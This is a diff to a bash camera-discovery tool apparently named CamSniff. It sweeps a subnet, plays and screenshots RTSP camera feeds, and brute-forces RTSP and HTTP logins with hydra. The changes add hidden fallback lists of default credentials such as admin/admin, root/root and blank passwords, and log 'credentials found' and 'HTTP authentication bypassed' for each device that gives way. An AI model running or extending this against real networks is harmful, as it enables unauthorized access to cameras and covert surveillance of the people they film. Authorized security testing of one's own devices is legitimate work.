@@ -76,22 +76,29 @@ launch_mosaic(){
       -filter_complex "xstack=inputs=${#STREAMS[@]:-0}:layout=0_0|w0_0|0_h0|w0_h0[mosaic];[mosaic]drawtext=fontsize=20:fontcolor=white:box=1:boxcolor=black@0.5:text='CamSniff Live Feed - ${#STREAMS[@]} Cameras':x=10:y=10[out]" \
       -map "[out]" -f matroska - 2>/dev/null | ffplay -window_title "CamSniff Enhanced Mosaic" -loglevel error - &
   else
-    # Simple display for 1-2 cameras
-    ffplay -window_title "CamSniff Camera Feed" -loglevel error "${!STREAMS[@]}" &
+    # Simple display for 1-2 cameras: expand keys safely
+    urls=()
+    for k in "${!STREAMS[@]:-}"; do urls+=("$k"); done
+    ffplay -window_title "CamSniff Camera Feed" -loglevel error "${urls[@]}" &
   fi
   
   local mosaic_pid=$!
   log "Mosaic started (PID: $mosaic_pid). Press Ctrl+C to stop."
-  
+
   # Save active mosaic info
+  mkdir -p "$OUTPUT_DIR"
   echo "$mosaic_pid" > "$OUTPUT_DIR/mosaic.pid"
-  
-  unset STREAMS; declare -A STREAMS
+
+  # Reset STREAMS map safely
+  unset STREAMS
+  declare -A STREAMS
 }
 
 # Function to take screenshot and analyze
 screenshot_and_analyze(){
-  u=$1; ip=${u#*://}; ip=${ip%%[:/]*}; 
+  u=$1
+  ip=${u#*://}
+  ip=${ip%%[:/]*}
   out="$OUTPUT_DIR/screenshots/snap_${ip}_$(date +%H%M%S).jpg"
   
   ffmpeg -rtsp_transport tcp -i "$u" -frames:v 1 -q:v 2 -y "$out" &>/dev/null && {
@@ -431,7 +438,16 @@ scan_rtsp(){
   # Enhanced brute-force if no stream found
   if (( !found )); then
     log_debug "Starting RTSP brute-force for $ip:$port"
-    hydra -L "$HYDRA_FILE" -P "$HYDRA_FILE" -s "$port" "$ip" rtsp -t "$HYDRA_RATE" &>/dev/null && {
+    # Use dedicated user/password lists if available
+    local users_file="${HYDRA_USER_FILE:-}"
+    local pass_file="${HYDRA_PASS_FILE:-}"
+    if [[ -z "$users_file" || -z "$pass_file" || ! -s "$users_file" || ! -s "$pass_file" ]]; then
+      # Fallback small lists
+      users_file="/tmp/.camsniff_users.txt"; pass_file="/tmp/.camsniff_passwords.txt"
+      printf "%s\n" admin root user guest >"$users_file" 2>/dev/null || true
+      printf "%s\n" admin 12345 123456 password root guest >"$pass_file" 2>/dev/null || true
+    fi
+    hydra -L "$users_file" -P "$pass_file" -s "$port" "$ip" rtsp -t "$HYDRA_RATE" &>/dev/null && {
       log "[HYDRA-RTSP] $ip:$port - Credentials found"
       log_device_info "$ip" "RTSP credentials discovered" "camera"
     }
@@ -474,7 +490,20 @@ scan_http(){
   scan_hls "$ip" "$port"
   
   # General HTTP brute-force
-  hydra -C "$HYDRA_FILE" -s "$port" http-get://"$ip" -t "$HYDRA_RATE" &>/dev/null && {
+  local combo_file="${HYDRA_COMBO_FILE:-}"
+  if [[ -z "$combo_file" || ! -s "$combo_file" ]]; then
+    combo_file="/tmp/.camsniff_combos.txt"
+    {
+      echo admin:admin
+      echo admin:12345
+      echo root:root
+      echo user:user
+      echo guest:guest
+      echo admin:
+      echo :
+    } >"$combo_file" 2>/dev/null || true
+  fi
+  hydra -C "$combo_file" -s "$port" http-get://"$ip" -t "$HYDRA_RATE" &>/dev/null && {
     log "[HYDRA-HTTP] $ip:$port - Access granted"
     log_device_info "$ip" "HTTP authentication bypassed" "web_device"
   }
@@ -562,7 +591,7 @@ sweep(){
   # Start scan animation in background
   scan_animation &
   local anim_pid=$!
-  trap "kill $anim_pid 2>/dev/null" EXIT
+  trap "kill $anim_pid 2>/dev/null" RETURN
 
   # Suppress fping and arp-scan output
   mapfile -t ALIVE < <(fping -a -g "$SUBNET" 2>/dev/null)
